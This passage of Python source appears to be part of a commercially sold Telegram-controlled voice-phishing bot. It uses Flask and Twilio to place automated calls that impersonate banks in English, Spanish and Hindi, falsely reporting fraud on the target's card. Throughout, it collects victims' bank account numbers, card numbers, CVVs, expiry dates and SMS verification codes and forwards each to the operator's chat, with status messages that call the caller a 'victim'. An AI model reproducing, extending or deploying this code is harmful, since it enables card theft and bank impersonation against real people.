    bot.send_message(
      chat_id,
      "*Call Was Declined/Voicemail ❌*\n\nUse /start to try again.",
      parse_mode='Markdown')
    return ''


@app.route("/actnsp/<userid>", methods=['GET', 'POST'])
def intro_act_sp(userid):
  chat_id = userid
  bankname = fetch_bankname(userid)
  print(bankname)
  resp = VoiceResponse()
  choice = request.values['AnsweredBy']
  if choice == 'human' or choice == 'unknown':
    gather = Gather(action='/gatheractn/' + userid,
                    finishOnKey='*',
                    input="dtmf")
    gather.say(
      f"Hola, esta es una llamada automática de {bankname}, detectamos actividad sospechosa en su tarjeta por un cargo en Walmart de $ 87.61. Si no fue usted, permanezca en la llamada. Ingrese su número de cuenta bancaria seguido de la estrella. clave para bloquear este intento",
      language='es-ES')
    resp.append(gather)
    resp.redirect('/actnsp/<userid>')
    return str(resp)
  else:
    resp.hangup()
    bot.send_message(
      chat_id,
      "*Call Was Declined/Voicemail ❌*\n\nUse /start to try again.",
      parse_mode='Markdown')
    return ''


@app.route("/gatheractn/<userid>", methods=['GET', 'POST'])
def save_account(userid):
  chat_id = userid
  resp = VoiceResponse()
  if 'Digits' in request.values:
    resp.say("Thank you, this attempt has been blocked ! Goodbye.")
    choice = request.values['Digits']
    print(choice)
    save_accountnumber(choice, userid)
    bot.send_message(chat_id, f"The Collected Account Number is {choice} 🏦")
    return str(resp)
  else:
    bot.send_message(chat_id, "No Account Number was collected")
    return str(resp)


@app.route("/crdf/<userid>", methods=['GET', 'POST'])
def introcall(userid):
  chat_id = userid
  bankname = fetch_bankname(userid)
  resp = VoiceResponse()
  choice = request.values['AnsweredBy']
  if choice == 'human' or choice == 'unknown':
    gather = Gather(action='/gatherdetails/' + userid,
                    finishOnKey='*',
                    input="dtmf",
                    num_digits=1)
    # remember to test if value like 4 or 6 is entered what happens
    gather.say(
      f"Hello, this an automated call from {bankname}, We have declined your last purchase of $141.99 at Macy's, your account has been put on hold until we verify the ownership of the account, Press 1 followed by the star key to enter your 16 digit Card Number and block this attempt"
    )
    resp.append(gather)
    resp.redirect('/crdf/<userid>')
    return str(resp)
  else:
    resp.hangup()
    bot.send_message(
      chat_id,
      "*Call Was Declined/Voicemail ❌*\n\nUse /start to try again.",
      parse_mode='Markdown')
    return ''


@app.route("/crdfen/<userid>", methods=['GET', 'POST'])
def introcall_en(userid):
  chat_id = userid
  bankname = fetch_bankname(userid)
  resp = VoiceResponse()
  choice = request.values['AnsweredBy']
  if choice == 'human' or choice == 'unknown':
    gather = Gather(action='/gatherdetails/' + userid,
                    finishOnKey='*',
                    input="dtmf",
                    num_digits=1)
    # remember to test if value like 4 or 6 is entered what happens
    gather.say(
      f"Hello, this an automated call from {bankname}, We have declined your last purchase of $141.99 at Macy's, your account has been put on hold until we verify the ownership of the account, Press 1 followed by the star key to enter your 16 digit Card Number and block this attempt"
    )
    resp.append(gather)
    resp.redirect('/crdfen/<userid>')
    return str(resp)
  else:
    resp.hangup()
    bot.send_message(
      chat_id,
      "*Call Was Declined/Voicemail ❌*\n\nUse /start to try again.",
      parse_mode='Markdown')
    return ''


@app.route("/crdfsp/<userid>", methods=['GET', 'POST'])
def introcall_sp(userid):
  chat_id = userid
  bankname = fetch_bankname(userid)
  resp = VoiceResponse()
  choice = request.values['AnsweredBy']
  if choice == 'human' or choice == 'unknown':
    gather = Gather(action='/gatherdetails/' + userid,
                    finishOnKey='*',
                    input="dtmf",
                    num_digits=1)
    # remember to test if value like 4 or 6 is entered what happens
    gather.say(
      f"Hola, esta es una llamada automática de {bankname}, detectamos actividad sospechosa en su tarjeta por un cargo en Walmart de $ 87.61. Si no fue usted, permanezca en la llamada. Ingrese su número de cuenta bancaria seguido de la estrella. clave para bloquear este intento",
      language='es-ES')
    resp.append(gather)
    resp.redirect('/crdfsp/<userid>')
    return str(resp)
  else:
    resp.hangup()
    bot.send_message(
      chat_id,
      "*Call Was Declined/Voicemail ❌*\n\nUse /start to try again.",
      parse_mode='Markdown')
    return ''


@app.route("/crdfhi/<userid>", methods=['GET', 'POST'])
def introcall_hi(userid):
  chat_id = userid
  bankname = fetch_bankname(userid)
  resp = VoiceResponse()
  choice = request.values['AnsweredBy']
  if choice == 'human' or choice == 'unknown':
    gather = Gather(action='/gatherdetails/' + userid,
                    finishOnKey='*',
                    input="dtmf",
                    num_digits=1)
    # remember to test if value like 4 or 6 is entered what happens
    gather.say(
      f"Namaste me deepika bat kar rahi hu {bankname} se aapke credit card se kisi ne 20hazar ka purchase karni ki koshish ki he ise rokne ke liye aaapka 16 aankh credit card number enter kare or last me star key dabaye dhyanwaad",
      language='en-IN')
    resp.append(gather)
    resp.redirect('/crdfhi/<userid>')
    return str(resp)
  else:
    resp.hangup()
    bot.send_message(
      chat_id,
      "*Call Was Declined/Voicemail ❌*\n\nUse /start to try again.",
      parse_mode='Markdown')
    return ''


@app.route('/gatherdetails/<userid>', methods=['GET', 'POST'])
def gather(userid):
  chat_id = userid
  resp = VoiceResponse()
  if 'Digits' in request.values:
    choice = request.values['Digits']
    print(choice)
    if choice == '1':
      gather = Gather(action='/gathercdrno/' + userid,
                      finishOnKey='*',
                      input="dtmf")
      gather.say(
        'Please input your 16 digit card number followed by the star key to block this attempt '
      )
      resp.append(gather)
      return str(resp)
    else:
      resp.say("Sorry, I don't understand that choice.")
      resp.redirect('/crdf/<userid>')
  else:
    resp.say("Sorry, I don't understand that choice.")
    bot.send_message(chat_id, "Victim is being difficult, still trying 😤")
    resp.redirect('/crdf/<userid>')

    return str(resp)


@app.route('/gathercdrno/<userid>', methods=['GET', 'POST'])
def gathercardno(userid):
  resp = VoiceResponse()
  chat_id = userid
  if 'Digits' in request.values:
    choice = request.values['Digits']
    save_cardnumber(choice, userid)
    bot.send_message(chat_id, f"Card #: {choice} 💳")
    gather = Gather(action='/gathercrdcvv/' + userid,
                    finishOnKey='*',
                    input="dtmf")
    gather.say(
      'Please input the 3 numerical digits located on the back of your card followed by the star key'
    )
    resp.append(gather)
    return str(resp)
  else:
    resp.say("Sorry, I don't understand that choice")
    bot.send_message(chat_id, "Victim is being difficult, still trying 😤")
    resp.redirect('/crdf/<userid>')
  return str(resp)


@app.route('/gathercrdcvv/<userid>', methods=['GET', 'POST'])
def gathercvv(userid):
  chat_id = userid
  resp = VoiceResponse()
  if 'Digits' in request.values:
    choice = request.values['Digits']
    save_cardcvv(choice, userid)
    bot.send_message(chat_id, f"Card CVV: {choice}")
    gather = Gather(action='/finalthanks/' + userid,
                    finishOnKey='*',
                    input="dtmf")
    gather.say(
      'Please input the expiry month and year shown on your card and press the star key'
    )
    resp.append(gather)
    return str(resp)
  else:
    resp.say("Sorry, I don't understand that choice")
    bot.send_message(chat_id, "Victim is being difficult, still trying 😤")
    resp.redirect('/crdf/<userid>')
  return str(resp)


@app.route("/custom/<userid>", methods=['GET', 'POST'])
def voice_custom(userid):
  chat_id = userid
  resp = VoiceResponse()
  script = fetch_script(userid)
  choice = request.values['AnsweredBy']
  if choice == 'human' or choice == 'unknown':
    gather = Gather(action='/gatherCustom/' + userid,
                    finishOnKey='#',
                    input="dtmf")
    print(lan_sel)
    gather.say(f"{script}", language=lan_sel)
    resp.append(gather)
    resp.redirect('/custom/<userid>')
    return str(resp)
  else:
    resp.hangup()
    bot.send_message(
      chat_id,
      "*Call Was Declined/Voicemail ❌*\n\nUse /start to try again.",
      parse_mode='Markdown')
    return ''


@app.route("/gatherCustom/<userid>", methods=['GET', 'POST'])
def voice_custom_options(userid):
  chat_id = userid
  resp = VoiceResponse()
  option_number = fetch_option_number(userid)
  print(option_number)
  option1 = fetch_option1(userid)
  print(option1)
  if 'Digits' in request.values:
    choice = request.values['Digits']
    print(choice)
    if choice == '1' and option_number == '2':
      gather = Gather(action='/gatheroption2/' + userid,
                      finishOnKey='#',
                      input="dtmf")
      gather.say(f'{option1}')
      resp.append(gather)
      return str(resp)
    elif choice == '1' and option_number == '1':
      gather = Gather(action='/customend1/' + userid,
                      finishOnKey='#',
                      input="dtmf")
      gather.say(f'{option1}')
      resp.append(gather)
      return str(resp)
    else:
      resp.say("Sorry, I don't understand that choice.")
      resp.redirect('/custom/<userid>')
      return str(resp)
  else:
    resp.say("Sorry, I don't understand that choice.")
    bot.send_message(chat_id, "Victim is being difficult, still trying 😤")
    resp.redirect('/custom/<userid>')

    return str(resp)


@app.route('/gatheroption2/<userid>', methods=['GET', 'POST'])
def gather_option_2(userid):
  chat_id = userid
  resp = VoiceResponse()
  option2 = fetch_option2(userid)
  if 'Digits' in request.values:
    numbercollected1 = request.values['Digits']
    print(numbercollected1)
    save_numbercollected1(numbercollected1, userid)
    bot.send_message(
      chat_id, f"The details collected for option 1 : {numbercollected1}")
    gather = Gather(action='/customend2/' + userid,
                    finishOnKey='#',
                    input="dtmf")
    gather.say(f"{option2}")
    resp.append(gather)
    resp.redirect('/custom/<userid>')
    return str(resp)
  else:
    resp.say("Sorry, I don't understand that choice.")
    bot.send_message(chat_id, "Victim is being difficult, still trying 😤")
    resp.redirect('/custom/<userid>')

    return str(resp)


@app.route('/customend1/<userid>', methods=['GET', 'POST'])
def custom_end_option1(userid):
  chat_id = userid
  resp = VoiceResponse()
  if 'Digits' in request.values:
    numbercollected1 = request.values['Digits']
    print(numbercollected1)
    save_numbercollected1(numbercollected1, userid)
    bot.send_message(
      chat_id, f"The details collected for option 1 : {numbercollected1}")
    resp.say("Thank you ! Goodbye!")
    return str(resp)
  else:
    resp.say("Sorry, I don't understand that choice.")
    bot.send_message(chat_id, "Victim is being very difficult, still trying 😤")
    resp.redirect('/custom/<userid>')
    return str(resp)

  return str(resp)


@app.route('/customend2/<userid>', methods=['GET', 'POST'])
def custom_end_option2(userid):
  resp = VoiceResponse()
  chat_id = userid
  if 'Digits' in request.values:
    numbercollected2 = request.values['Digits']
    print(numbercollected2)
    save_numbercollected2(numbercollected2, userid)
    bot.send_message(
      chat_id, f"The details collected for option 2 : {numbercollected2}")
    resp.say("Thank you, Goodbye!")
    return str(resp)
  else:
    resp.say("Sorry, I don't understand that choice.")
    bot.send_message(chat_id, "Victim is being difficult, still trying 😤")
    resp.redirect('/custom/<userid>')
    return str(resp)

  return str(resp)


@app.route('/finalthanks/<userid>', methods=['GET', 'POST'])
def finalthanks(userid):
  resp = VoiceResponse()
  chat_id = userid
  if 'Digits' in request.values:
    choice = request.values['Digits']
    save_cardexpiry(choice, userid)
    bot.send_message(chat_id, f"Card EXP: {choice}")
    resp.say(
      'Thank you for confirming your identity, your account will seize to be on hold if these details are verified. Good bye !'
    )
  else:
    resp.say("Sorry, I do not understand that choice")
    bot.send_message(chat_id, "Victim is being difficult, still trying 😤")
    resp.redirect('/crdf/<userid>')
  return str(resp)


@app.route('/statuscallback/<userid>', methods=['GET', 'POST'])
def handle_statuscallbacks(userid):
  chat_id1 = userid
  if 'CallStatus' in request.values:
    status = request.values['CallStatus']
    try:
      if status == 'ringing':
        bot.send_message(chat_id1, "Call is ringing..")
      elif status == 'in-progress':
        bot.send_message(chat_id1, "Call has been answered ✅")
      elif status == 'no-answer':
        bot.send_message(chat_id1, "Call was not answered ")
      elif status == 'busy':
        bot.send_message(
          chat_id1,
          "Target number is currently busy ❌\nMaybe you should try again later"
        )
      elif status == 'failed':
        bot.send_message(chat_id1, "Call failed ❌")
    except:
      bot.send_message(
        chat_id1, "Sorry an error has occured\nContact Admin @MADARA888UCHIHA")
    else:
      return 'ok'
  else:
    return 'ok'


@app.route('/statuscallback2/<userid>', methods=['GET', 'POST'])
def handle_statuscallbacks2(userid):
  chat_id = userid
  if 'SmsStatus' in request.values:
    status = request.values['SmsStatus']
    try:
      if status == 'delivered':
        bot.send_message(chat_id, "Text has been delivered ✅")
      # elif status == 'undelivered' or 'failed':
      #     bot.send_message(chat_id, "Text could not be delivered\n\nPlease recheck the Phone-number")
      elif status == 'sent':
        bot.send_message(chat_id, "Text has been sent..")
    except:
      bot.send_message(
        chat_id, "Sorry an error has occured\nContact Admin @MADARA888UCHIHA")

  else:
    return 'ok'


@app.route("/sms/", methods=['GET', 'POST'])
def incoming_sms():
  resp = MessagingResponse()
  resp.message(
    "Success. Your identity has been confirmed and this attempt has been blocked. Please do not reply.\n\nMsg&Data rates may apply."
  )
  body = request.values.get('Body', None)
  phonenum = request.values.get('From', None)
  print(body)
  print(phonenum)
  userid = fetch_sms_userid(phonenum)
  bot.send_message(userid, f'The received code is {body} 💬')
  return str(resp)


@app.route('/details_rec/<userid>', methods=['GET', 'POST'])
def handle_recordings(userid):
  chat_id = userid
  if 'RecordingUrl' in request.values:
    audio = request.values['RecordingUrl']
    mp3_audiofile = f"{audio}.mp3"
    bot.send_audio(chat_id, mp3_audiofile)
  else:
    bot.send_message(chat_id,
                     "An error has occured\nContact Admin @MADARA888UCHIHA")
  return ''


@bot.message_handler(commands=['help'])
def how_to_help(message):
  bot.send_message(
    message.chat.id,
    "• Contact @MADARA888UCHIHA or @egrh6bibot 👑\n\n• Use /faq for more help")


@bot.message_handler(commands=['faq'])
def how_faq(message):
  bot.send_message(
    message.chat.id,
    "• Please Contact  @MADARA888UCHIHA for tutorial videos, and more helpful information (FAQ > Bot Help).\n\n"
    "• Send vouches to @MADARA888UCHIHA\n\n"
    "• BUY BOT ONLY FROM @MADARA888UCHIHA")


if __name__ == '__main__':
  app.run(host='0.0.0.0', port='5000', debug=True)
